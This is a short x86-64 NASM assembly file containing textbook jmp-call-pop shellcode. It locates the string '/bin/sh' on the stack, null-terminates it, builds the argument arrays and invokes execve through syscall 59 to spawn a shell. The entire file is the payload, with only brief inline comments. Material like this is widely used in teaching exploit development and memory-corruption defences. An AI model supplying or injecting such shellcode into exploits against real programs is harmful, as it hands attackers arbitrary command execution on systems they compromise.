global _start

section .text

_start:
	jmp find_address

shellcode:
	xor rax, rax

	; Get address of the string
	pop	rdi

	; Convert the A -> 0x00 to null terminate the string
	mov byte [rdi + 7], al

	; Copy the address of the string in rdi into BBBBBBBB
	mov [rdi + 8], rdi

	; Copy the NULL 0x00000000000000 -> CCCCCCCC
	mov [rdi + 16], rax		

	; Setup the addresses
	lea rsi, [rdi +8]
	lea rdx, [rdi +16]

	; execve
	add rax, 59
	syscall

find_address:
	call shellcode
message: db "/bin/shABBBBBBBBCCCCCCCC"
